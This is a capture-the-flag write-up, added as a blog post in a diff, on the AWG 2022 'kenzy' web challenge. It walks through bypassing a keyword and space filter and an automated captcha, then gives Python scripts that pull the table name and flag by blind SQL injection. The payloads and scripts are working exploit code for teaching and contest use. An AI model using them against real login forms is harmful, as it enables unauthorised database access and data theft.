@@ -1,0 +1,223 @@
+---
+title: "kenzy challenge Writeup"
+author: "0xMesbaha"
+cover: "/media/kenzy/logo.jpg"
+tags: ["CTF", "sql-injection"]
+date: 2022-08-06T12:49:18+34:08
+draft: false
+---
+
+|             |                                               |
+| ----------- | --------------------------------------------- |
+| CTF name      | [AWG 2022](https://www.ascyberwargames.com/) |
+| challenge    | kenzy|
+| category   | web        |
+|about| SQL injection|
+|description| captcha is not that secure|
+|	points   | 900 |
+|  team | [0xCha0s](https://ctftime.org/team/168238) |
+
+## Discovery
+
+we are introduced with this page which takes username ,password and the Captcha
+
+![error](/media/kenzy/20220806020216.png)
+
+If we check the source code we can notice this comment
+
+```cmd
+        <!-- Username =====> admin -->
+```
+
+we can also find the endpoint which generates the captcha each time we request it different captcha is assigned
+
+```cmd
+http://34.175.249.72:60001/scripts/captcha.php
+```
+
+Let's check the application by submitting the admin as a username and any password with a valid captcha
+
+![error](/media/kenzy/20220806021154.png)
+
+It returns an `invalid username or password` because we don't really know the correct password and default credentials don't work
+
+as we want to be able to login without password , we should think of SQL injection. 
+
+![error](/media/kenzy/20220806021637.png)
+
+trying a basic payload at the password we can see this result which is a great hint for SQLi , we should be in the correct path but this page doesn't reveal much.
+
+![error](/media/kenzy/20220806021712.png)
+
+
+Trying some payloads in the password filed wasn't really helpful as when we tried `admin' OR 1=1#` it returns same response for `1=1` and `1=2` . so it doesn't work really well. we can take a look at the username field. 
+
+Trying `username=admin' OR 1=1#` we got this response 
+
+```cmd
+ {"Username":"admin'1=1#","status":"statement error"}
+```
+
+we can see the **OR** is removed and the spaces as well ! , same thing with the **AND**
+
+-> Bypass filters :
+
+The most famous bypass for the spaces filter is replacing it with `/**/` , and we can try use `OORR` instead of `OR` so if `OR` is removed from `OORR` we got our `OR` if filters are not so restricted . same for `AND` we can use `AANDND`
+```cmd
+username=admin'/**/AANDND/**/1=1#
+```
+
+and we got the wished results 
+
+![error](/media/kenzy/20220806022447.png)
+
+
+To make sure we have a valid Blind SQL injection we should be able to control input to trigger 2 different responses one for the True case and The False one. 
+
+Trying same payload with `1=2` to be
+
+```cmd
+username=admin'/**/AANDND/**/1=2#
+```
+
+we will get this response , so we can control this input !
+
+```json
+{"Username":"admin'/**/AND/**/1=2#","status":"Invalid username or password"}
+```
+
+it will be a tedious process to write the captcha each time with each request , specially blind sqli will issue a lot of requests so we need to build some sort of python script to automate this process
+
+## Exploitation 
+
+First we need to parse the captcha somehow , we can try issue a request to `/scripts/captcha.php` to see if the response contains the captcha as text.
+
+![error](/media/kenzy/20220806023237.png)
+
+and indeed it sends the captcha base64 encoded , so we can parse it easily and get the value .
+
+```py
+import requests
+import base64
+
+s = requests.Session()
+url = "http://34.175.249.72:60001/scripts/captcha.php"
+r = s.get(url)
+captcha = str(r.content).split(':')[-1].replace('"','').replace("'",'')
+captcha_decode = base64.b64decode(base64.b64decode(captcha)).decode('utf-8')
+print(captcha_decode)
+```
+This code will parse the captcha and get us the decoded value which we need during the login process. now we need to send another request to the login page to see the response 
+
+```py
+url2 = 'http://34.175.249.72:60001/index.php'
+payload = f"admin' AND 1=1#".replace(' ','/**/').replace('AND','ANANDD')
+data = {'username' :payload, 
+	    'password': "admin"  ,
+	    'captcha' : captcha_decode ,
+	    'send' :'Send'
+		}
+r2 = s.post(url2 , data=data )
+print(r2.text)
+```
+
+assembling the 2 code snippets above we will see the exploit works as expected indeed , now we can start constructing our query to retrieve table name and the flag content.
+
+```py
+import requests
+import base64
+from urllib.parse import quote
+
+table=""
+counter = 1
+
+flag = True
+while flag :
+    s = requests.Session()
+    flag = False
+    for i in range (32,126) :
+        url = "http://34.175.249.72:60001/scripts/captcha.php"
+        r = s.get(url)
+        captcha = str(r.content).split(':')[-1].replace('"','').replace("'",'')
+        captcha_decode = base64.b64decode(base64.b64decode(captcha)).decode('utf-8')
+        url2 = 'http://34.175.249.72:60001/index.php'
+        payload = f"admin' AND {i}=ascii(substr((SELECT table_name FROM information_schema.tables where table_schema=database() limit 1),{counter},1))#".replace(' ','/**/').replace('AND','ANANDD')
+
+        data = {
+        
+        'username' :payload, 
+        'password': "admin"  ,
+        'captcha' : captcha_decode ,
+        'send' :'Send'
+        }
+    
+        r2 = s.post(url2 , data=data )
+        print(f"{table+chr(i)}")
+        if "Treasures" in r2.text :
+            table +=chr(i)
+            flag = True
+            break
+    counter +=1
+```
+
+we have just made 2 loops , the Flag variable is important as it will be the factor to stop the code . basically it will allow the while loop to keep iterating if we found a letter in the insider loop but if it did iterate through all characters and doesn't found a valid one it will not loop again , it will exit.
+
+the query has 2 variables the counter and the ascii representation of the desirable letter  . 
+
+Running the code above we got the table name is `solve` .
+
+## Getting the Flag
+
+will use same approach to get the flag content , we can guess the column is named flag and we can verify that by using this payload
+
+```py
+payload = "admin' AND 'f'=substr((select column_name from information_schema.columns WHERE table_name='solve' limit 1),1,1)#".replace(' ','/**/').replace('AND','ANANDD')
+```
+and will find `f` is valid as the first character in the ``column_name`` , we can continue until we find column name is `flag` indeed
+
+now we can start ask for each character in our flag until we get the last character which should be `}`
+
+```py
+import requests
+import base64
+from urllib.parse import quote
+
+flag= "ASCWG{"
+counter = 7 # start after ASCWG{
+while not flag.endswith("}") :
+	s = requests.Session()
+	for i in range (31,126) :
+		url = "http://34.175.249.72:60001/scripts/captcha.php"
+		r = s.get(url)
+		captcha = str(r.content).split(':')[-1].replace('"','').replace("'",'')
+		captcha_decode = base64.b64decode(base64.b64decode(captcha)).decode('utf-8')
+		#print(captcha_decode)
+		url2 = 'http://34.175.249.72:60001/index.php'	
+		payload = f"admin' AND {i}=ascii(substr((select flag from solve limit 1),{counter},1))#".replace(' ','/**/').replace('AND','ANANDD')
+		data = {	    
+	    'username' :payload, 
+	    'password': "admin"  ,
+	    'captcha' : captcha_decode ,
+	    'send' :'Send'
+		}
+		r2 = s.post(url2 , data=data )
+		#print(r2.text)
+		print(f"{flag+chr(i)}")
+		if "Treasures" in r2.text :
+			flag +=chr(i)
+			break
+	counter +=1
+```
+
+Running the script now 
+
+![error](/media/kenzy/20220806025633.png)
+
+
+and after some time we will get our flag eventually which is 
+
+```cmd
+ASCWG{23fsdc$@#EAScasq12_hard}
+```
+
+![error](https://c.tenor.com/n-NpYkvi3y4AAAAC/%D8%A8%D9%87%D8%AC%D8%AA%D8%B5%D8%A7%D8%A8%D8%B1-bahgat-saber.gif)
